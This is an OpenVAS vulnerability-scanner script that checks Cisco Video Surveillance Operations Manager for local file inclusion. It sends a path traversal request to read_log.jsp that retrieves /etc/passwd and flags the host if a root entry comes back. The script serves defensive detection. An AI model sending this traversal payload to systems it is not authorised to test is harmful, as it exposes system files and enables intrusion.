###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cisco_video_surveillance_lfi_03_2013.nasl 6755 2017-07-18 12:55:56Z cfischer $
#
# Cisco Video Surveillance Operations Manager Multiple vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Cisco Video Surveillance Operations Manager is prone to:

1. A Local file inclusion vulnerability.
2. A XSS vulnerability.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103678";
CPE = 'cpe:/a:cisco:video_surveillance_manager';

if (description)
{
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 6755 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
 script_name("Cisco Video Surveillance Operations Manager Multiple vulnerabilities");

 script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/120790/Cisco-Video-Surveillance-Operations-Manager-6.3.2-XSS-LFI-Bypass.html");

 script_tag(name:"last_modification", value:"$Date: 2017-07-18 14:55:56 +0200 (Tue, 18 Jul 2017) $");
 script_tag(name:"creation_date", value:"2013-03-14 17:43:31 +0100 (Thu, 14 Mar 2013)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("CISCO");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_cisco_video_surveillance_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("cisco_video_surveillance_manager/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

url = '/BWT/utils/logs/read_log.jsp?filter=&log=../../../../../../../../../etc/passwd';

if(http_vuln_check(port:port, url:url, pattern:'root:.*:0:[01]:')) {
  report = report_vuln_url( port:port, url:url );
  security_message(port:port, data:report);
  exit(0);

}  
